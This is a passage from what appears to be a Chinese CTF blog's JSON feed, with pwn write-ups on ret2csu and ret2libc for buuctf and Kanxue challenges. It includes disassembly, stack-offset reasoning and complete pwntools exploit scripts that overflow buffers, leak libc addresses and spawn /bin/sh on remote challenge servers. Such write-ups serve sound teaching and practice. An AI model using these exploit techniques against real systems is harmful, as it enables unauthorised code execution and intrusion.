__frame_dummy_init_array_entry\n.text:00000000004011C8                 push    rbp\n.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:00000000004011D0                 push    rbx\n.text:00000000004011D1                 sub     rbp, r12\n.text:00000000004011D4                 sub     rsp, 8\n.text:00000000004011D8                 call    _init_proc\n.text:00000000004011DD                 sar     rbp, 3\n.text:00000000004011E1                 jz      short loc_4011FE\n.text:00000000004011E3                 xor     ebx, ebx\n.text:00000000004011E5                 nop     dword ptr [rax]\n.text:00000000004011E8\n</code></pre>\n<p>gadgets2:</p>\n<pre><code>.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j\n.text:00000000004011E8                 mov     rdx, r15\n.text:00000000004011EB                 mov     rsi, r14\n.text:00000000004011EE                 mov     edi, r13d\n.text:00000000004011F1                 call    qword ptr [r12+rbx*8]\n.text:00000000004011F5                 add     rbx, 1\n.text:00000000004011F9                 cmp     rbp, rbx\n.text:00000000004011FC                 jnz     short loc_4011E8\n.text:00000000004011FE\n</code></pre>\n<p>gadgets1:</p>\n<pre><code>.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j\n.text:00000000004011FE                 add     rsp, 8\n.text:0000000000401202                 pop     rbx\n.text:0000000000401203                 pop     rbp\n.text:0000000000401204                 pop     r12\n.text:0000000000401206                 pop     r13\n.text:0000000000401208                 pop     r14\n.text:000000000040120A                 pop     r15\n.text:000000000040120C                 retn\n.text:000000000040120C ; &#125; // starts at 4011B0\n.text:000000000040120C __libc_csu_init endp\n</code></pre>\n<p>这里搬运之前在 CSDN 上发的文章（汇编代码执行顺序为先 gadgets2, 然后 gadgets1）</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/8abb18a591a445808abc86226a99d2c9.png\" alt=\"\" /></p>\n<p>pop 命令 会把栈中的值存入相应的寄存器中，那么我们可以通过往栈中写对应的数据来存入寄存器里</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/8400e847c08a419ba7c04f174dc26712.png\" alt=\"\" /></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cmp</span>     rbx, rbp   //cpm后的不同的调整指令有着不同的作用，这里 jnz 比较结果相同不跳转，不相同就跳转</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>jnz     short loc_400580</pre></td></tr></table></figure><p>最后第二次回到 gadget1 时，此时已经给寄存器赋值完毕只需要回到 ret，此处填充 56 个 padding 字符是因为在地址 0x4011FE 处有   <code>add rsp , 8 </code>  这会把 rsp 栈提高 8，所以要填充 8 个字符来站这个位置，后面的  <code>pop rbx ~ pop r15</code>  共有 6 个寄存器，pop 了 6 次，所以总共是 （6+1）*8=56，所以填充 56 个字符即可到 ret 来控制程序执行</p>\n<p>例题:<a href=\"https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/\" title=\"ret2csu\">https://vvwwvv.cn/2023/05/04/pwn/ 刷题 / 看雪社区 / 看雪社区 pwn8 (64 位构造通用 ROP,ret2csu)/</a></p>\n",
            "tags": [
                "pwn",
                "ret2csu"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/",
            "title": "buuctf.pwn",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<p>#buuctf<br />\n##[HarekazeCTF2019]baby_rop2</p>\n<p>##pwn2_sctf_2016<br />\n<img data-src=\"kerd.png\" alt=\"\" /></p>\n<p>##&lt;center&gt;<strong>31.<strong>jarvisOJ_level3(<strong>ret2libc</strong>)&lt;/center&gt;<br />\n####1. 下载源文后查看文件保护和位数<br />\n<img data-src=\"https://s1.ax1x.com/2023/09/06/pPsjif1.md.png\" alt=\"\" /><br />\n ####2. 发现是 32 位程序，开启了 NX (栈不可执行)<br />\n####，利用 ida 反编译查看程序 C 语言代码<br />\n<img data-src=\"https://s1.ax1x.com/2023/09/06/pPsjPYR.md.png\" alt=\"\" /><br />\n #### 发现有 vul 函数进入查看<br />\n<img data-src=\"https://s1.ax1x.com/2023/09/06/pPsjCk9.png\" alt=\"\" /><br />\n ####3. 发现有 write 和 read 函数，其中 read 函数可以进行栈溢出，可以对此利用 \t注意:write (1, 输出地址，输出字节数)<br />\n 因为没有发现后门函数，所以利用</strong> write 泄露 libc 的地址来执行 system (/bin/sh)</strong><br />\n###exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tcontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tp<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28074</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\te<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./level3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\twrite_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tread_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tmain<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tpayload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>read_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">#p.recvuntil(\"Input:\\n\")</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tread<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tlibc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>read<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tlibcbase<span class=\"token operator\">=</span>read<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tsystem<span class=\"token operator\">=</span>libcbase<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tbinsh<span class=\"token operator\">=</span>libcbase<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tpayload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>#### 此题无法用 libcsearcher 远程库找到 libc</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "ctf"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/",
            "title": "ciscn_s_3（利用系统调用+ret2csu）",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<h1 id=\"ciscn_s_3\"><a class=\"anchor\" href=\"#ciscn_s_3\">#</a> ciscn_s_3</h1>\n<h3 id=\"1下载附件后查看程序信息\"><a class=\"anchor\" href=\"#1下载附件后查看程序信息\">#</a> 1. 下载附件后查看程序信息</h3>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sKKK.png\" alt=\"\" /></p>\n<p>可以看到是 64 位程序，并且开启了 NX</p>\n<h3 id=\"2利用ida反汇编\"><a class=\"anchor\" href=\"#2利用ida反汇编\">#</a> 2. 利用 ida 反汇编</h3>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6s85d.md.png\" alt=\"\" /></p>\n<p>发现有个 vul 函数，进入查看</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sJPA.png\" alt=\"\" /></p>\n<p>发现是 sys_read 函数，并且可以通过 <strong>sys_read 溢出</strong>，查看汇编代码</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sY8I.png\" alt=\"\" /></p>\n<p>发现有 syscall，由此判断是系统调用，那么我们通过 <strong>控制寄存器</strong> 的方式来进行系统调用然后 getshell</p>\n<h3 id=\"3漏洞利用分析\"><a class=\"anchor\" href=\"#3漏洞利用分析\">#</a> 3. 漏洞利用分析</h3>\n<p>此处放上之前的文章：<a href=\"https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/\" title=\"Linux之系统调用\">https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</a></p>\n<p>上面链接里能看到 64 位系统的系统调用号，找到 execve 命令是 59（0x3b）</p>\n<pre><code class=\"language-C\">\nint execve(const char *filename, char *const argv[], char *const envp[]);\n\n//const char *filename 为要执行文件的地址\n\n//char *const argv[]：传递给程序的完整参数列表，包括argv[0]，它一般是程序的名\n\n//char *const envp[]：一般传递NULL，表示可变参数的结尾。\n\n</code></pre>\n<p>我们要执行的是  <code>execve(&quot;/bin/sh&quot;,0,0)</code>  来 getshell</p>\n<h3 id=\"4控制寄存器\"><a class=\"anchor\" href=\"#4控制寄存器\">#</a> 4. 控制寄存器</h3>\n<p>将 0x3b 存入 rax 寄存器，64 位系统调用寄存器顺序依次为：rdi，rsi，rdx</p>\n<p>本想着通过 Ropgadgets 查找对应寄存器构造 rop 链</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sHR1.png\" alt=\"\" /></p>\n<p>但是发现无法控制 rax 寄存器与 rdx 寄存器，所以要使用其他方法</p>\n<p>查看汇编发现有个 gadgets 函数，但是不知道为什么在代码流程图里没有显示后面的部分</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sxde.png\" alt=\"\" /></p>\n<p>此处看到 0x3b 存入了 rax，正好是 execve 的系统调用号 (也可以在 ida 窗口中按 alt+t 查找 mov rax,3bh 指令，找到指令存储位置为 0x4004E2)</p>\n<p>接着需要控制相应的传参寄存器，rdi，rsi，rdx，rcx, r8, r9。因为可以溢出的字符很多，那么我们可以利用   <strong>csu_init（ret2csu）</strong>  这一段代码，因为 64 位程序需要该函数对 libc 进行初始化，一般的程序都会调用 libc 函数，所以 <strong>一定存在</strong> 这个函数，并且该函数先于 main 函数执行</p>\n<p>原理:<a href=\"https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu\" title=\"64位构造通用ROP\">https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu</a></p>\n<h4 id=\"5构造rop\"><a class=\"anchor\" href=\"#5构造rop\">#</a> 5. 构造 rop</h4>\n<p>通过 ida 可以找到 csu 段地址，下面为 gadgets1</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcCbss.png\" alt=\"\" /></p>\n<p>当我们进入 gadgets1 时，执行了 add rsp ,8 所以要填充 8 个字符，后续的 rbx 要为 0 才能不跳转，rbp 为 1 使其与后续加 1 后的 rbx 相同，r12 不需要所以可以任意，r13，r14，r15 分别会在 gadgets2 控制 rdx，rsi，rdi，填入我们需要的值，具体值如下：</p>\n<ul>\n<li>rbx=0</li>\n<li>rbp=1</li>\n<li>r12=0</li>\n<li>r13=0  （对应 rdx=0）</li>\n<li>r14=0  （对应 rsi=0）</li>\n<li>r15=&quot;binsh&quot; 的地址  （对应 rdi=&quot;/bin/sh&quot;）</li>\n</ul>\n<p>此处执行的是  <code>execve(&quot;/bin/sh&quot;,0,0)  </code>  execve( rdi , rsi , rdx )</p>\n<p>由此我们需要找到 &quot;/bin/sh&quot; 地址，由于程序内找不到 &quot;/bin/sh&quot; , 所以需要我们自己写入 &quot;/bin/sh&quot;</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcCjoV.png\" alt=\"\" /></p>\n<p>由上面的图可以看到，sys_wrtie 会输出 0x30 个字符，而 buf 在栈上只有 0x10 的大小，后面紧接着的 0x10 为 ret 和初始的 rbp 所占空间，后面 8 个字符为栈上的某一地址， <strong>利用该地址减去与 &quot;/bin/sh&quot; 地址的偏移量</strong> 即可获得 &quot;/bin/sh&quot; 地址。（这里是因为开启了保护每次在栈上的地址不同，而偏移是不会变的）</p>\n<p><strong>查看方式 1</strong></p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcii9S.png\" alt=\"\" /></p>\n<p>由上面的图片可以看出输入的字符串的地址（这里因为溢出所以应该为 ddf0），而看到距离 rsp 为 0x20 的地方输出了我们调试的程序的名称，这个一般是保存在 avrg [0]，这个是栈上的地址</p>\n<p><strong>查看方式 2</strong></p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcFrGT.png\" alt=\"\" /></p>\n<p>首先为写入的 buf 地址，然后在 0x20 大小后为栈地址，原因入下图，因此通过 sys_write 即可泄露</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcAxxS.png\" alt=\"\" /></p>\n<p>由于开启了保护所以写入栈的位置是不固定的，但是可以通过当此运行时泄露的栈地址减去固定的偏移量即可得到写入的字符串地址</p>\n<h3 id=\"7字符串地址计算方法\"><a class=\"anchor\" href=\"#7字符串地址计算方法\">#</a> 7. 字符串地址计算方法:</h3>\n<p>通过上面的 0x7fffffffdf38-0x7fffffffddf0=0x148 , 在计算栈的偏移时是 0x148（不知道是不是因为计算错误），但是线上靶场的环境栈的偏移是 0x118。</p>\n<p>在本地可以利用 patchelf 切换 libc 版本</p>\n<pre><code>patchelf --set-interpreter ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ ./ciscn_s_3\n</code></pre>\n<p>有了偏移之后就可以通过偏移量来计算输入的字符串地址：</p>\n<p><strong>输入字符串地址 = 泄露的栈地址 - 0x118</strong></p>\n<p>至此就得到了 &quot;/bin/sh&quot; 地址</p>\n<h3 id=\"8构造exp\"><a class=\"anchor\" href=\"#8构造exp\">#</a> 8. 构造 exp</h3>\n<p>因为 &quot;/bin/sh&quot; 占 7 个字节，需要改成 &quot;/bin/sh\\x00&quot; 来用隔断符来满足 8 个字节进行对齐</p>\n<p>先执行 syscall 还是先到 gadgets:</p>\n<p>先 gadgets 最后返回到 syscall</p>\n<p>系统调用号与 syscall 之间的执行顺序：</p>\n<p>系统调用号执行后返回到 syscall，参数都在前面</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26711</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./ciscn_s_3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main<span class=\"token operator\">=</span><span class=\"token number\">0x04004ED</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>execve<span class=\"token operator\">=</span><span class=\"token number\">0x0004004E2</span> <span class=\"token comment\">#mov rax,3BH; ret;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>syscall<span class=\"token operator\">=</span><span class=\"token number\">0x000400501</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>gadgets1<span class=\"token operator\">=</span><span class=\"token number\">0x000040059a</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>gadgets2<span class=\"token operator\">=</span><span class=\"token number\">0x0000400580</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x004005a3</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gadgets1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span> <span class=\"token comment\">#此处 r15 的值可有可无，因为后面仍然调用 rdi_ret 来传参</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    payload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>gadgets2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>execve<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 此处之间填充到 ret，没有考虑 rbp，gdb 中调试就可以发现</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>binsh<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x118</span> <span class=\"token comment\">#减去偏移获得 \"/bin/sh\" 地址</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>binsh<span class=\"token operator\">+</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>binsh<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 这里的 binsh+0x50 是传入字符串 \"/bin/sh\" 后开始，到 p64（execve）</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#p.recv()</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>借用别人的一张图理解 binsh+0x50<br />\n<img data-src=\"https://img-blog.csdnimg.cn/20210423174224878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpZXlpY2hlbnNzcw==,size_16,color_FFFFFF,t_70\" alt=\"\" /></p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9aTEZ4RA==\">http://t.csdn.cn/ZLFxD</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9TU1k5bw==\">http://t.csdn.cn/SSY9o</span></p>\n<p>注意：不知道是不是因为部分地方没写对，用之前的 csu 方法有点问题，总要 binsh+0x50 才可以</p>\n",
            "tags": [
                "pwn",
                "ret2csu",
                "ctf",
                "系统调用"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/",
            "title": "看雪社区pwn8（64位构造通用ROP，ret2csu）",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<h3 id=\"查看程序\"><a class=\"anchor\" href=\"#查看程序\">#</a> 查看程序</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/1ed670b5ceeb462994b707ec5fcfcfef.png\" alt=\"\" /></p>\n<h3 id=\"64位程序开启了nx\"><a class=\"anchor\" href=\"#64位程序开启了nx\">#</a> 64 位程序，开启了 NX</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/9c917aba36be440a838d8ac8b70a0c2d.png\" alt=\"\" /></p>\n<p>有溢出漏洞， <strong>变量为 char 型变量</strong></p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/72ef02703ac246488cecade776d65acd.png\" alt=\"\" /></p>\n<p>没有后门函数， 那就 &lt;font color=red&gt; 去 libc 中找 execve 地址执行 &lt;/font&gt;</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/d4fe1b33d8224911a9d218d861317b60.png\" alt=\"\" /></p>\n<p>偏移量为 136</p>\n<pre><code>write：write(1，输出地址，输出字节数)      \n             write(1,write_got,8)                \nread：read(0,写入地址，写入字节数)\n             read(0,bss_base,16)\n</code></pre>\n<p>exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn8\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn8\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>write<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>read<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token 